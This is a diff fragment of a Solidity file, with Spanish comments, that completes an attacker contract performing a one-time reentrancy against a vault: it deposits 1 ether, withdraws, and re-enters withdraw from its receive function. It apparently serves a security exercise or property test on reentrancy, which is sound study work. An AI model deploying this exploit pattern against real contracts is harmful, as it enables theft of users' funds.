@@ -47,15 +47,21 @@ interface IVault {
 // lo que el handler sabe hacer rompe la propiedad", nada mas.
 contract AtacanteUnaVez {
     IVault public vault;
-
+    bool entro = false;
     constructor(IVault _vault) {
         vault = _vault;
     }
 
     function attack() external payable {
+        vault.deposit{value: 1 ether}(); //Deposito uno para poder hacer withdraw, porque sino cuando withdraw chequea balances[msg.sender] != 0 falla porque los mappings en Solidity retornan cero para toda entrada no registrada
+        vault.withdraw();
     }
 
     receive() external payable {
+        if (!entro){
+            entro = true;
+            vault.withdraw(); //Re-entramos una sola vez
+        }
     }
 }
 
